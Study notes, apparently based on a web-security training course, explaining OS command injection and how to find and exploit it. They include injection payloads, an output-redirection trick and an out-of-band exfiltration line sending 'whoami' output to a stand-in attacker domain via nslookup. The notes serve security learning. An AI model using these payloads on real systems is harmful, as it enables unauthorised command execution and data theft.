
## what is OS command injection 
* OS command injection is also known as shell injection or RCE
* it is vulnerability that allow an attacker to execute any command on the system and take full control of the server.
* attacker can leverage an OS command injection vulnerability to compromise other parts of the hosting infrastructure, exploiting trust relationships to pivot the attack to other systems within the organization.
* the vulnerability may present at any parameter that may directly supply it to the internal shell but we need some proxy to check that it may interact with the hidden parameter or in the API request.

# find and exploit os-command injection vulnerability

## Use full command
|Purpose |Linux|Windows|
|---|---|---|
|name of current user|'whoami'|'whoami'|
|OS| 'uname -a'|'ver'|
|Network configuration|'ifconfig'or'ipaddr|'ipconfig/all'|
|Network Connection|'nestat -an'|'netstat -an'|
|Running Process|'ps -ef'|'tasklist'|

## Blind Command injection vulnerability 
* many instance of os COmmand injection are blind vulnerabilities, means application does not return output from the command with http response.
* Consider a web site that lets users submit feedback about the site. The user enters their email address and feedback message. The server-side application then generates an email to a site administrator containing the feedback. To do this, it calls out to the `mail` program with the submitted details. For example: 
`mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com`

## Detecting Blind OS Command Injection using Time Delay.
* for generating time delay the `ping` command is use full because it send number of ICMP packet so to complete this command application takes time and delay generates in the application response time.
* put `|| && ` like terminal command ending or ';' to terminate the command or giving error, analyze more and try to exploit RCE.

## Exploiting Bling RCE BY Redirecting output
* You can redirect the output from the injected command into a file within the web root that you can then retrieve using your browser. For example, if the application serves static resources from the filesystem location `/var/www/static`, then you can submit the following input:
`& whoami > /var/www/static/whoami.txt &`

* You can then use your browser to fetch `https://vulnerable-website.com/whoami.txt` to see the output;
## Exploiting blind OS command injection using out-of-band ([OAST](https://portswigger.net/burp/application-security-testing/oast)) techniques)

### Blind-os command injection Out-of-band interaction
* You can use an injected command that will trigger an out-of-band network interaction with a system that you control, using OAST techniques.
* `& nslookup kgji2ohoyw.web-attacker.com &`
* use burp Collaborator for OAST.

### Blind-os-command injection Out-Of-band data exfiltration.
* ``& nslookup `whoami`.kgji2ohoyw.web-attacker.com &`` payload here in between \`\`we can add our command and execute lookup.
* response in collaborator  `wwwuser`.id.collaborator.net

## ways of injection OS commands
* \&
* \&\&
* |
* ||

only unix-based os 
* \;
* Newline(0x0a or \\n)

On Unix-based system we use
`` `command` or $(command)``
